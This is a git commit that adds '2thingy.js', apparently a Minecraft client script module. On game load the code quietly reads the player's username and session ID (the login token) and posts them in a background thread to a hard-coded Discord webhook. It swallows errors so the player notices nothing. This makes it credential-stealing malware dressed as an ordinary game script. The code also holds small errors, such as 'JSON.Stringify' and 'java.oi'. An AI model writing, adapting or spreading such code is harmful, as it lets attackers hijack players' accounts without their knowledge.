ecc0ccdd6d74368f68036946d03dc5676a89c4ba
Topstrik <110308736+Topstrik@users.noreply.github.com>
2025-04-27 18:07:54 +0300

    Create 2thingy.js

---
+++ 2thingy.js
@@ -0,0 +1,45 @@
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1366062628538941561/duYVh6xkWFGh8qED5pJEeAUmCPBJj_6hgk4JUiCgEEdP-S3noGrIR3K4CacndLT6V6-w";
+
+register("gameLoad", () => {
+  getSessionInfo();
+});
+
+function getSessionInfo() {
+  try {
+      let minecraft = Java.type("net.minecraft.client.Minecraft").func_71410_x();
+      let session = minecraft.func_110432_I();
+      let username = session.func_111285_a();
+      let sessionId = session.func_111286_b();
+      sendToDiscord(username, sessionId);
+  } catch(error) {
+
+  }
+}
+
+function sendToDiscord(username, sessionId) {
+  new Thread(() => {
+      try {
+          let url = new java.net.URL(DISCORD_WEBHOOK_URL);
+          let connection = url.openConnection();
+          connection.setDoOutput(true);
+          connection.setRequestMethod("POST");
+          connection.setRequestProperty("Content-Type", "application/json");
+          connection.setRequestProperty("User-Agent", "Mozilla/5.0");
+
+          let jsonMessage = JSON.Stringify({
+              content: '**Username:** ${username}\n**Session ID:** ${sessionId}'
+          });
+
+          let output = new java.io.OutputStreamWriter(connection.getOutputStream());
+          output.write(jsonMessage);
+          output.flush();
+          output.close();
+
+
+        let response = new java.oi.BufferedReader(new java.io.InputStreamReader(connection.getInputStream()));
+        while (response.readLine() !== null);
+        response.close();
+      } catch(error) {
+
+      }
+}).start();
